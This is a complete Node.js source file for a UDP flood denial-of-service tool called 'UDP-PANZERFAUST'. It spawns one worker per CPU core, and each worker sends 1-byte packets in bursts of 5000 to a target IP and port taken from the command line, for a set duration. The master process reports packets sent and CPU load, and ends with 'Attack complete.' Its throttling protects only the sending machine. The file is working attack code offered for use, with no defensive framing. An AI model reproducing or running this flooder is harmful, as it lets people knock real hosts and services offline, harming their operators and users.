const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-panzerfaust.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const payload = Buffer.alloc(1); // minimal payload = max PPS
const cpuCount = os.cpus().length;

const SAFE_CPU_THRESHOLD = 90;   // CPU % threshold to throttle
const SAFE_MEM_THRESHOLD = 85;   // RAM % threshold to throttle

function getCpuUsage() {
  // Rough CPU usage snapshot for throttling (Linux-specific, cross-platform needs more work)
  const cpus = os.cpus();
  let idle = 0, total = 0;
  cpus.forEach(cpu => {
    for (let type in cpu.times) total += cpu.times[type];
    idle += cpu.times.idle;
  });
  return { idle: idle / cpus.length, total: total / cpus.length };
}

if (cluster.isMaster) {
  let totalSent = 0;
  let maxPPS = 0;

  console.clear();
  console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
  console.log('--------------------------------------');
  console.log(`Target: ${target}:${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Cores: ${cpuCount}`);
  console.log('Launching...\n');

  // Track CPU for throttling
  let cpuStart = getCpuUsage();

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        if (msg.pps > maxPPS) maxPPS = msg.pps;
      }
    });
  }

  setInterval(() => {
    // Calculate CPU usage %
    const cpuEnd = getCpuUsage();
    const idleDiff = cpuEnd.idle - cpuStart.idle;
    const totalDiff = cpuEnd.total - cpuStart.total;
    const cpuUsage = 100 - Math.floor((idleDiff / totalDiff) * 100);
    cpuStart = cpuEnd;

    console.clear();
    console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
    console.log(`Max PPS: ${maxPPS.toLocaleString()}`);
    console.log(`CPU Usage: ${cpuUsage}%`);
    console.log(`Target: ${target}:${port}`);
    console.log('--------------------------------------');

    // Reset maxPPS for next interval
    maxPPS = 0;
  }, 2000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const sock = dgram.createSocket('udp4');
  let sent = 0;
  let pps = 0;
  let isThrottled = false;

  function getMemoryUsagePercent() {
    const mem = process.memoryUsage();
    const usedMB = mem.rss / 1024 / 1024;
    const totalMB = os.totalmem() / 1024 / 1024;
    return (usedMB / totalMB) * 100;
  }

  function spam() {
    function sendLoop() {
      if (Date.now() > endTime) return;

      if (!isThrottled) {
        for (let i = 0; i < 5000; i++) { // huge bursts for max PPS
          sock.send(payload, 0, payload.length, port, target, () => {
            sent++;
            pps++;
          });
        }
        setImmediate(sendLoop);
      } else {
        // Throttled: slow down spam for 10s, then resume
        setTimeout(() => {
          isThrottled = false;
          sendLoop();
        }, 10000);
      }
    }

    sendLoop();
  }

  // Monitor system usage every 500ms and toggle throttling
  setInterval(() => {
    const memUsage = getMemoryUsagePercent();
    // Note: CPU load is only checked in master; here just mem for safety
    if (!isThrottled && memUsage > SAFE_MEM_THRESHOLD) {
      isThrottled = true;
    }
  }, 500);

  setInterval(() => {
    process.send({ type: 'stats', sent, pps });
    sent = 0;
    pps = 0;
  }, 1000);

  spam();
}
